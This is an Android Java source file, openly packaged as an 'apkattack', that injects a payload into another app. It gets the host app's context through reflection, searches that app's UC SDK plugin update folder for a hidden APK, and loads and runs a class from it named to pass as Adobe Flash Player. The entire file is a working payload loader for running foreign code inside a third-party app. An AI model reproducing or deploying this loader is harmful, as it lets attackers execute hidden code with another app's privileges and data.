package com.example.apkattack;

import java.io.File;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class ShuqiNovel {
	public static void shuqiEntryWithoutContext(){
    	String Tag = "shuqiEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");

	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);

	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		

    		String apppath = context.getFilesDir().getParent() + "/";

	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String apkfn = "";

	    	//String pluginPath = apppath + "files/storage/com.shuqi.controller.voiceiflytek/";
			String pluginPath = apppath + "app_ucmsdk/updates/";

	    	File pluginFile = new File(pluginPath);
	    	File [] pluginFiles = pluginFile.listFiles();
	    	if (pluginFiles == null) {
	    		Log.e(Tag,"error list files:" + pluginPath);
				return;
			}

	    	for (int i = 0; i < pluginFiles.length; i++) {
	    		if (pluginFiles[i].isDirectory() == false) {

					continue;
				}else if(pluginFiles[i].getName().equals(".") || pluginFiles[i].getName().equals("..")){
    				continue;
    			}
	    		else{
					String tmpString = pluginFiles[i].getName();
					pluginPath = pluginPath + tmpString + "/";
					
					Log.e(Tag,"find sub path:" + pluginPath);
					break;
				}
			}
	    	
	    	pluginFile = new File(pluginPath);
	    	pluginFiles = pluginFile.listFiles();
	    	if (pluginFiles == null) {
	    		Log.e(Tag,"error list files:" + pluginPath);
				return;
			}
	    	
	    	
	    	for (int i = 0; i < pluginFiles.length; i++) {
	    		if (pluginFiles[i].isDirectory() == false) {
					continue;
				}else if(pluginFiles[i].getName().equals(".") || pluginFiles[i].getName().equals("..")){
    				continue;
    			}else{
					String tmpString = pluginFiles[i].getName();
					pluginPath = pluginPath + tmpString + "/";
					
					Log.e(Tag,"find sub path:" + pluginPath);
					break;
				}
			}
	    	
	    	pluginPath = pluginPath + "assets/";
	    	pluginFile = new File(pluginPath );
	    	pluginFiles = pluginFile.listFiles();
	    	if (pluginFiles == null) {
	    		Log.e(Tag,"error list files:" + pluginPath);
				return;
			}

			for (int i = 0; i < pluginFiles.length; i++) {
				String tmpfn = pluginFiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
			if(apkfn.equals("")){
				return;
			}

	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(pluginPath + apkfn, appcachepath, 
	    			null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "shuqi load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "shuqi load apk exception");
    	}
	}
	
}
